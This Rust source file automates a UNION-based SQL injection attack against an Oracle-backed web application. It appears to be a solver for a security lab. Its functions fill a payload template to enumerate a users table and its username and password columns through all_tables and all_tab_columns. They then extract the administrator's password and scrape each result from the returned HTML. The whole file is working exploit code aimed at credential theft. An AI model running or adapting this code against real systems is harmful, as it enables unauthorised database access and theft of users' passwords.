use my_request::*;

pub struct Values {
    value1: String,
    value2: String,
    value3: String,
    value4: String,
    value5: String,
}

impl Values {
    fn new(value1: &str, value2: &str, value3: &str, value4: &str, value5: &str) -> Self {
        Values {
            value1: value1.to_string(),
            value2: value2.to_string(),
            value3: value3.to_string(),
            value4: value4.to_string(),
            value5: value5.to_string(),
        }
    }
}

pub async fn union_select(
    client: &MyClient,
    endpoint: &str,
    payload: &str,
) -> anyhow::Result<Option<String>> {
    let values = Values::new(
        "table_name",
        "all_tables",
        "table_name",
        "%USE%",
        "rownum = 1",
    );
    let users_table = union_payload(client, endpoint, payload, values)
        .await?
        .expect("Getting Users Table");

    let values = Values::new(
        "COLUMN_NAME",
        "all_tab_columns",
        "table_name",
        &users_table,
        "rownum = 1",
    );
    let usernames_column = union_payload(client, endpoint, payload, values)
        .await?
        .expect("Getting Usernames Column");

    let values = Values::new(
        "COLUMN_NAME",
        "all_tab_columns",
        "table_name",
        &users_table,
        "COLUMN_NAME LIKE '%PA%'",
    );
    let passwords_column = union_payload(client, endpoint, payload, values)
        .await?
        .expect("Getting Passwords Column");

    let values = Values::new(
        &passwords_column,
        &users_table,
        &usernames_column,
        "%adm%",
        "rownum = 1",
    );
    let password = union_payload(client, endpoint, payload, values).await?;
    Ok(password)
}

pub async fn union_payload(
    client: &MyClient,
    endpoint: &str,
    payload: &str,
    values: Values,
) -> anyhow::Result<Option<String>> {
    let payload = payload
        .replace("{value1}", &values.value1)
        .replace("{value2}", &values.value2)
        .replace("{value3}", &values.value3)
        .replace("{value4}", &values.value4)
        .replace("{value5}", &values.value5);

    let payload = urlencoding::encode(&payload);
    let endpoint = format!("{}{}", endpoint, &payload);
    let res = client.get_request(&endpoint, None).await?;
    if res.status().is_success() {
        let text = res.text().await?;
        let mut x = client
            .scrape(&text, "table", "is-table-longdescription", "th", None)
            .await?;
        let result = x.pop();
        return Ok(result);
    }
    Ok(None)
}
